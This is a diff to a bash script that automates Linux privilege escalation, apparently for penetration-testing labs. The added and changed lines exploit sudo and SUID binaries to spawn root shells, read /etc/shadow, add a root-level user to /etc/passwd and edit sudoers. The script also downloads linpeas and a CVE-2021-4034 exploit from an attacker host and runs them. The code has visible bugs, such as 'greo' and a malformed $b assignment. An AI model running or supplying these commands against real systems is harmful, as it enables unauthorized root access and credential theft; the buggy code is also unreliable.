@@ -12,6 +12,7 @@
 now=$(date)
 i=$(whoami)
 d=$(id)
+b=$(/usr/bin/)
 
 cd /tmp
 
@@ -55,13 +56,30 @@ if grep "apt-get" info.txt; then
 	fi
 fi
 
+echo -e '\E[31;40m' "Looking at sudo rights"; tput sgr0
+echo -e '\E[31;40m' "Ran SUDO with user $i on $now" > /tmp/sudo.txt; tput sgr0
+sudo -l >> /tmp/sudo.txt
+read -p "Would you like to try and auto exploit any SUDO rights? (y/n):" answer
+if [ $answer = n ]; then
+	echo -e '\E[31;40m' "Not trying to exploit anything, you can see SUDO rights in /tmp/sudo.txt"; tput sgr0
+else
+	if egrep 'awk|find' sudo.txt; then
+		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
+		if grep -w $b"awk" sudo.txt; then
+			sudo awk 'BEGIN {system("/bin/sh")}'
+		elif grep -w $b"find" sudo.txt; then
+			sudo find . -exec /bin/sh -p \; -quit
+		fi
+	fi
+fi
+
 echo -e '\E[31;40m' "Looking at SUID Bits"; tput sgr0
-echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" > suid.txt; tput sgr0
-find / -perm -u=s -type f 2>/dev/null >> suid.txt
-grep -i "/usr/bin/*" suid.txt > suid1.txt
-rm -rf suid.txt
-mv suid1.txt suid.txt
-cat suid.txt
+echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" > /tmp/suid.txt; tput sgr0
+find / -perm -u=s -type f 2>/dev/null >> /tmp/suid.txt
+grep -i $b"*" /tmp/suid.txt > /tmp/suid1.txt
+rm -rf /tmp/suid.txt
+mv /tmp/suid1.txt /tmp/suid.txt
+cat /tmp/suid.txt
 echo -e '\E[31;40m' "Saved SUID Bits to suid.txt"; tput sgr0
 read -p "Would you like to try and auto exploit any SUID bits? (y/n):" answer
 if [ $answer = n ]; then
@@ -69,28 +87,28 @@ if [ $answer = n ]; then
 else
 	if egrep 'find|bash|busybox|chmod|chroot|wget|vim|systemctl|agetty|cabal|capsh|choom|chown|chroot|dash|emacs|env|dmsetup|docker|expect|fish|flock|gcore|gdb|genie|gimp|cp' suid.txt; then
 		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
-		if grep "/usr/bin/find" suid.txt; then
+		if grep $b"find" suid.txt; then
 			/usr/bin/find . -exec /bin/bash -p \; -quit
-		elif grep -w "/usr/bin/gimp" suid.txt; then
+		elif grep -w $b"gimp" suid.txt; then
 			/usr/bin/gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
-		elif grep "/usr/bin/gcore" suid.txt; then
+		elif grep $b"gcore" suid.txt; then
 			ss
 			read -p "PID number to move into?" answer
 			PID=$answer
 			/usr/bin/gcore $PID
-		elif greo "/usr/bin/genie" suid.txt; then
+		elif greo $b"genie" suid.txt; then
 			/usr/bin/genie -c '/bin/sh'
-		elif grep "/usr/bin/gdb" suid.txt; then
+		elif grep $b"gdb" suid.txt; then
 			/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
-		elif grep "/usr/bin/fish" suid.txt; then
+		elif grep $b"fish" suid.txt; then
 			/usr/bin/fish
-		elif grep "/usr/bin/flock" suid.txt; then
+		elif grep $b"flock" suid.txt; then
 			/usr/bin/flock -u / /bin/sh -p
-		elif grep "/usr/bin/bash" suid.txt; then
+		elif grep $b"bash" suid.txt; then
 			/usr/bin/bash -p
 		elif grep "busybox" suid.txt; then
 			/usr/bin/busybox sh
-		elif grep "/usr/bin/chmod" suid.txt ; then
+		elif grep $b"chmod" suid.txt ; then
 			cd /usr/bin
 			LFILE=/etc/passwd
 			./chmod 6777 $LFILE
@@ -107,12 +125,12 @@ else
 		elif grep "chroot" suid.txt; then
 			/usr/bin/chroot / /bin/sh -p
 			/usr/sbin/chroot / /bin/sh -p
-		elif grep "/usr/bin/wget" suid.txt; then
+		elif grep $b"wget" suid.txt; then
 			TF=$(mktemp)
 			chmod +x $TF
 			echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
 			./wget --use-askpass=$TF 0
-		elif grep "/usr/bin/vim"; then
+		elif grep $b"vim"; then
 			/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 		elif grep "unzip"; then
 			cd /usr/bin
@@ -149,7 +167,7 @@ else
 			cat /etc/shadow | grep -i root2
 		elif grep "chroot" suid.txt; then
 			/usr/bin/chroot / /bin/sh -p
-		elif grep "/usr/bin/cp" suid.txt; then
+		elif grep $b"cp" suid.txt; then
 			echo '\E[31;40m' "Going through a few different things, cp has a lot"
 			LFILE=/etc/passwd
 			echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
@@ -180,17 +198,17 @@ else
 			/usr/bin/dash -p
 		elif grep "emacs" suid.txt; then
 			/usr/bin/emacs -Q -nw --eval '(term "/bin/sh -p")'
-		elif grep "/usr/bin/env" suid.txt; then
+		elif grep $b"env" suid.txt; then
 			/usr/bin/env /bin/sh -p
 		elif grep "dmsetup" suid.txt; then
 			/usr/bin/dmsetup "create base <<EOF
 			0 3534848 linear /dev/loop0 94208
 			EOF
 			./dmsetup ls --exec /bin/sh -p -s'"
-		elif grep "/usr/bin/docker" suid.txt; then
+		elif grep $b"docker" suid.txt; then
 			read -p "Docker type (ex: alpine):" answer
 			/usr/bin/docker run -v /:/mnt --rm -it $answer chroot /mnt sh
-		elif grep -w "/usr/bin/expect" suid.txt; then
+		elif grep -w $b"expect" suid.txt; then
 			/usr/bin/expect -c 'spawn /bin/sh -p;interact'
 		else
 		echo -e '\E[31;40m' "Nothing to automatically exploit at this time by $i on $now withing group $d"
@@ -205,7 +223,7 @@ if [ $answer = n ]; then
 else
 	echo -e '\E[31;40m' "Looking for files that will allow us to read another file (ex: /etc/shadow)"; tput sgr0
 	if egrep 'base|cat|alpine|ascii-xfr|ash|aspell|atobm|awk|bridge|bzip2|cmp|column|comm|csplit|csvtool|cupsfilter|curl|cut|date|genisoimage|debugfs|dialog|diff|dig|dosbox|expand|efax|espeak|arp|eqn|fmt|gawk|ar|ed|dd|bc|as' suid.txt; then
-		if grep -w "/usr/bin/expand" suid.txt; then
+		if grep -w $b"expand" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/expand "$LFILE"
@@ -213,23 +231,23 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/genisoimage -sort "$LFILE"
-		elif grep -w "/usr/bin/gawn" suid.txt; then
+		elif grep -w $b"gawn" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/gawk '//' "$LFILE"
-		elif grep -w "/usr/bin/fold" suid.txt; then
+		elif grep -w $b"fold" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/fold -w99999999 "$LFILE"
-		elif grep -w "/usr/bin/fmt" suid.txt; then
+		elif grep -w $b"fmt" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/fmt -999 "$LFILE"
-		elif grep -w "/usr/bin/file" suid.txt; then
+		elif grep -w $b"file" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/file -f $LFILE	 
-		elif grep -w "/usr/bin/eqn" suid.txt; then
+		elif grep -w $b"eqn" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/eqn "$LFILE"
@@ -237,23 +255,23 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/espeak -qXf "$LFILE"
-		elif grep -w "/usr/bin/awk" suid.txt; then
+		elif grep -w $b"awk" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer 
 			/usr/bin/awk '//' "$LFILE"
-		elif grep -w "/usr/bin/base32" suid.txt ; then
+		elif grep -w $b"base32" suid.txt ; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/base32 "$LFILE" | base32 --decode
-		elif grep -w "/usr/bin/base64" suid.txt ; then
+		elif grep -w $b"base64" suid.txt ; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/base64 "$LFILE" | base64 --decode
-		elif grep -w "/usr/bin/basenc" suid.txt ; then
+		elif grep -w $b"basenc" suid.txt ; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/basenc --base64 $LFILE | basenc -d --base64
-		elif grep -w "/usr/bin/cat" suid.txt; then
+		elif grep -w $b"cat" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/cat "$LFILE"
@@ -261,7 +279,7 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/alpine -F "$LFILE"
-		elif grep -w "/usr/bin/as" suid.txt; then
+		elif grep -w $b"as" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/as @$LFILE
@@ -269,7 +287,7 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/ascii-xfr -ns "$LFILE"
-		elif grep -w "/usr/bin/ash" suid.txt; then
+		elif grep -w $b"ash" suid.txt; then
 			/usr/bin/ash
 		elif grep -w "aspell" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
@@ -279,7 +297,7 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
-		elif grep -w "/usr/bin/awk" suid.txt; then
+		elif grep -w $b"awk" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/awk '//' "$LFILE"
@@ -288,7 +306,7 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/basez "$LFILE" | basez --decode
-		elif grep -w "/usr/bin/bc" suid.txt; then
+		elif grep -w $b"bc" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/bc -s $LFILE
@@ -326,7 +344,7 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
-		elif grep -w "/usr/bin/curl" suid.txt; then
+		elif grep -w $b"curl" suid.txt; then
 			read -p "File to get from attacker machine (ex: shell.elf):" answer
 			URL=http://$LHOST:$LPORT/$answer
 			LFILE=$answer
@@ -335,11 +353,11 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/cut -d "" -f1 "$LFILE"
-		elif grep -w "/usr/bin/date" suid.txt; then
+		elif grep -w $b"date" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/date -f $LFILE
-		elif grep -w "/usr/bin/dd" suid.txt; then
+		elif grep -w $b"dd" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			echo "data" | /usr/bin/dd of=$LFILE
@@ -350,11 +368,11 @@ else
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/dialog --textbox "$LFILE" 0 0
-		elif grep -w -w "/usr/bin/diff" suid.txt; then
+		elif grep -w -w $b"diff" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/diff --line-format=%L /dev/null $LFILE
-		elif grep -w -w "/usr/bin/dig" suid.txt; then
+		elif grep -w -w $b"dig" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/dig -f $LFILE
@@ -373,7 +391,7 @@ else
 			LFILE=/etc/sudoers
 			/usr/bin/dosbox -c 'mount c /' -c "echo $LUSER ALL=(ALL) NOPASSWD:ALL >c:$LFILE" -c exit
 			sudo su
-		elif grep -w "/usr/bin/ed" suid.txt; then
+		elif grep -w $b"ed" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/ed file_to_read
@@ -384,11 +402,11 @@ else
 			LFILE=$answer
 			/usr/bin/efax -d "$LFILE"
 #KEEP ARP AT THE BOTTOM OF FILE
-		elif grep -w "/usr/bin/arp" suid.txt; then
+		elif grep -w $b"arp" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
 			/usr/bin/arp -v -f "$LFILE"
-		elif grep -w "/usr/bin/ar" suid.txt; then
+		elif grep -w $b"ar" suid.txt; then
 			TF=$(mktemp -u)
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer
@@ -432,29 +450,44 @@ if grep LEGEND lin.txt
 then
 	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
 else
-	read -p "Press enter when web server (python3 -m http.server $LPORT) is started on kali machine? (y/n):" 
+	read -p "Press enter when web server (python3 -m http.server $LPORT) is started on kali machine:" 
 	cd /tmp
 	wget http://$LHOST:$LPORT/linpeas.sh
 	echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
 	echo -e '\E[31;40m' "Running linpeas with user $i on $now"; tput sgr0
+	echo -e '\E[32;40m' "Linpeas is saving to file lin.txt and is not frozen, do not cancel"; tput sgr0
 	bash linpeas.sh > lin.txt
 fi
 if grep CVE-2021-4034 lin.txt
 then
 	echo -e '\E[31;40m' "Vulnerable to Sudo exploit CVE-2021-4034";tput sgr0
-	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
+	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"; tput sgr0
 	read -p "Would you like to exploit this vulnerability (y/n):" answer
 	if [ $answer = n ] ; then
 		echo -e '\E[31;40m' "Not exploiting";tput sgr0
 	elif [ $answer = y ] ; then
 		echo -e '\E[32;40m' "Trying to download exploit from user machine" ;tput sgr0
-		echo -e '\E[31;40m' "Do a 'wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
-		read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
-		wget http://$LHOST:$LPORT/cve-2021-4034-poc.c
-		gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
-		./cve-2021-4034-poc
+		which python3
+		if [ $? == 0 ]; then
+			echo -e '\E[32;40m' "Python3 is on the machine, utilizing CVE-2021-4034.py"
+			echo -e '\E[31;40m' "Do a 'https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py' to local kali machine and make sure python server is still running" ;tput sgr0
+			read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
+			wget http://$LHOST:$LPORT/CVE-2021-4034.py
+			python3 CVE-2021-4034.py
+		elif [ $? != 0 ]; then
+			which gcc
+			if [ $? == 0 ]; then
+				echo -e '\E[32;40m' "GCC is on the machine, trying to exploit with CVE-2021-4034.c"; tput sgr0
+				echo -e '\E[31;40m' "Do a 'https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
+				read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
+				gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+				./cve-2021-4034-poc
+			else
+				echo -e '\E[31;40m' "Python3 nor GCC exists cannot exploit at this time"; tput sgr0
+			fi
 		else
 			echo -e '\E[31;40m' "Continuing Script";tput sgr0
+		fi
 	fi
 fi
 
